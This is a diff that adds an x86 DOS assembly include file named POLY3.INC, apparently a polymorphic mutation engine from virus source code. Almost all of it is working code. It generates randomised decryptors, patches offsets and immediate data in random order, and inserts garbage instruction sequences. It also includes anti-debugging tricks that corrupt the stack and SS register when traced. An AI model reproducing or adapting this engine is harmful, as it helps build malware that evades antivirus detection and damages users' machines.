+        mov     si,offset clearpiq
+        mov     cx,4
+        rep     movsb
+        pop     dx              ; dx=(decryptor length in bytes+1)/2
+
+        push    di
+        mov     si,offset junkcode
+        mov     cx,4
+        rep     movsb
+        pop     di
+        pop     si
+        push    di
+
+        mov     [junkend],di
+        xchg    di,ax
+        sub     ax,[polylen]
+        add     ax,[declen]
+        add     ax,[execofs]
+        mov     di,[initptr]
+        stosw
+        add     ax,[count]
+        mov     di,[decdone]
+        stosw
+        mov     cx,dx
+
+; ok, so, I build a list of patch locs, after generating all the garbage
+; I need to go back and put the correct offset in as well as the immediate data
+
+patchnext:
+        lodsw                   ; ax = patchloc
+        xchg    di,ax
+        mov     ax,06C7
+        stosw                   ; store the mov
+differentone:
+        mov     ax,dx           ; dx=number of patches
+        call    getrnd          ; ax=rnd number between 0 and number of patches
+        shl     ax,1
+        mov     bx,ax
+        add     bx,offset decryptor
+        cmp     [word bx],-1
+        jz      differentone
+        add     ax,[junkend]    ; ax=offset of the end of the junk
+        sub     ax,[polylen]    ; ax=offset relative to 0
+        add     ax,[execofs]    ; ax=offset relative to where it will execute
+        stosw                   ; store the offset
+        mov     ax,[bx]         ; ax=decryptor code
+        mov     [word bx],-1    ; mark it as used
+        stosw                   ; store the imm value
+        loop    patchnext
+
+; I want to make the immediate data random... (decryptor is built in random
+; order) What info do I need?  I gotta know the patch loc, and which piece of
+; decryptor info I'm gonna patch, I guess I could just choose a random number,
+; multiply by 2 calculate the corresponding offset in the decryptor, get the
+; decryptor word... that's it
+
+        pop     ax
+        add     ax,[declen]
+        mov     di,ax
+        xchg    ax,[polylen]
+        sub     [polylen],ax
+        ret
+
+garbagecount = 8
+garbagetable:
+        db      4
+        mov     ah,1
+        int     16
+
+        db      4
+        mov     ah,2
+        int     16
+
+        db      4
+        mov     ah,11
+        int     16
+
+        db      6
+        mov     ah,3
+        xor     bx,bx
+        int     10
+
+        db      6
+        mov     ah,8
+        xor     bx,bx
+        int     10
+
+        db      12d
+        push    ds              ; 1
+        xor     bx,bx           ; 2
+        mov     ds,bx           ; 2
+        not     [word bx+5]     ; 3
+        not     [word bx+5]     ; 3
+        pop     ds              ; 1
+
+        db      17d
+        mov     bp,sp                   ; 2
+        call    messitup                ; 3
+        mov     ah,4C                   ; 2
+        int     21                      ; 2
+messitup:
+        mov     sp,[bp-2]               ; 3
+        add     sp,10                   ; 3
+        mov     sp,bp                   ; 2
+donemessingthingsup:
+
+        db      7                       ; if we're tracing, this should
+        mov     bx,ss                   ; randomly clobber something :)
+        mov     ss,ax
+        xchg    bx,ax
+        mov     ss,ax
+
+getversion:
+        mov     ah,30
+        int     21
+        cmp     al,3
+        jae     goodversion
+junkcode:
+        mov     ah,4C
+        int     21
+goodversion:
+
+include "getrnd.inc"
+
+encryptor:
+        db      maxenclen dup(90)
+        ret
+
+decryptor:
+        db      maxenclen+10d dup(90)
+; mov reg,imm   ; 3
+; inc reg       ; 1
+; inc reg       ; 1
+; cmp reg,imm   ; 3
+; jb            ; 2
+
+clearpiq:
+        xor     cx,cx
+        jcxz    $+2
+
+ptrtable:
+        db      110b            ; si
+        db      100b            ; [si]
+        db      111b            ; di
+        db      101b            ; [di]
+        db      011b            ; bx
+        db      111b            ; [bx]
+
+crypttable:
+        db      30              ; xor     [],imm
+        db      37              ; xor     [bx],imm
+        db      0               ; add     [],imm
+        db      2F              ; sub     [bx],imm
+        db      28              ; sub     [],imm
+        db      7               ; add     [bx],imm
+
+pattern db      ?               ; make sure that we have xor, sub/add, xor etc
+
+declen  dw      ?
+junkend dw      ?
+count   dw      ?
+polylen dw      ?
+execofs dw      ?
+patch   dw      ?
+
+initptr dw      ?
+decdone dw      ?
+
+loophere dw     ?
+
+;=[END POLY3.INC]============================================================
+
